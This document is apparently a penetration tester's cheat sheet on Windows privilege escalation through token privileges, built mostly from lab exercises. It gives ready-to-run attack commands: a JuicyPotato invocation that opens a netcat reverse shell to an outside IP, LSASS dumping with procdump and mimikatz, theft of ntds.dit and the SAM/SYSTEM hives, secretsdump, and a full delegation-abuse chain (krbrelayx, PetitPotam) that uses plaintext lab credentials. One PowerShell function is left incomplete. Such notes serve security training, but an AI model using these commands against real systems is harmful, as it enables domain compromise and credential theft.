# User Rights Assignment
```powershell
RUN AS ADMINISTRATOR
whoami /priv

SeDebugPrivilege
SeTcbPrivilege
SeImpersonatePrivilege
SeLoadDriverPrivilege
SeBackupPrivilege
SeTakeOwnershipPrivilege
```

# Disabled Privilege --> ENABLED
```powershell
# Bu daxili funksiya göstərilən hüququ dərhal 'Enabled' vəziyyətinə gətirir
function Enable-Privilege ([string]$privilegeName) {
    $type = Add-Type -PassThru -TypeName "Win32Privs" -MemberDefinition @'
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
        
        public struct TOKEN_PRIVILEGES {
            public uint PrivilegeCount;
            public long Luid;
            public uint Attributes;
        }
'@
}


#
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

# SeImpersonate and SeAssignPrimaryToken
```powershell
# Juicy Potato
reg query HKCR\CLSID /s /f LocalService
HKEY_CLASSES_ROOT\CLSID\{8BC3F05E-D86B-11D0-A075-00C04FB68820}
    LocalService    REG_SZ    winmgmt

HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
    LocalService    REG_SZ    winmgmt

.\juicypotato.exe -l 4141 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a " /c c:\users\default\tools\nc.exe -e cmd.exe 10.10.14.150 4141" -t *
sudo nc -lnvp 8443

post/multi/recon/local_exploit_suggester

[use exploit/windows/local/ms16_075_reflection_juicy](https://github.com/hardsoftsecurity/Offensive-Security-Tools/tree/main/TokenExploitation)
```

# SeDebugPrivilege
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

Ctrl + Shift + ESC --> lsass.exe --> Create Dump File
```

# SeTakeOwnershipPrivilege
```powershell
takeown /f C:\Windows\NTDS\ntds.dit
icacls C:\Windows\NTDS\ntds.dit /grant %username%:F
vssadmin create shadow /for=C:
```

# SeBackupPrivilege
```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Copying NTDS.dit
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

# Secretsdump
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

# SeEnableDelegationPrivilege
```powershell
 impacket-addcomputer -dc-ip 10.129.234.69 -computer-name pwn delegate.vl/N.Thompson:'KALEB_2341'

bloodyAD -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host '10.129.234.69' add uac 'pwn$' -f TRUSTED_FOR_DELEGATION

python3 ./krbrelayx/dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -r pwn.delegate.vl -d 10.10.15.254 --action add 10.129.234.69

python3 ./krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/pwn' -t 'pwn$' -dc-ip 10.129.234.69 10.129.234.69

bloodyAD -d delegate.vl --dc-ip 10.129.234.69 -u 'N.Thompson' -p 'KALEB_2341' get object 'pwn$' --attr 'servicePrincipalName'

dig pwn.delegate.vl @10.129.234.69

python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4","9k3VxHcDZZCRlE2zmqbhI1ntJPULRxyX".encode("utf16le")).digest()).decode())'868cc835d19a9e9ffb7adbc0b2f6ef4f

python3 ./krbrelayx/krbrelayx.py -hashes :868cc835d19a9e9ffb7adbc0b2f6ef4f

python3 PetitPotam.py -target-ip 10.129.234.69 -u 'pwn$' -p '9k3VxHcDZZCRlE2zmqbhI1ntJPULRxyX' pwn dc1.delegate.vl

KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache impacket-secretsdump -just-dc-user Administrator -k dc1.delegate.vl

```

# SeLoadDriverPrivilege
[Print Operators](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/11-Print%20Operators.md)

# SeRestorePrivilege
[Server Operators]()
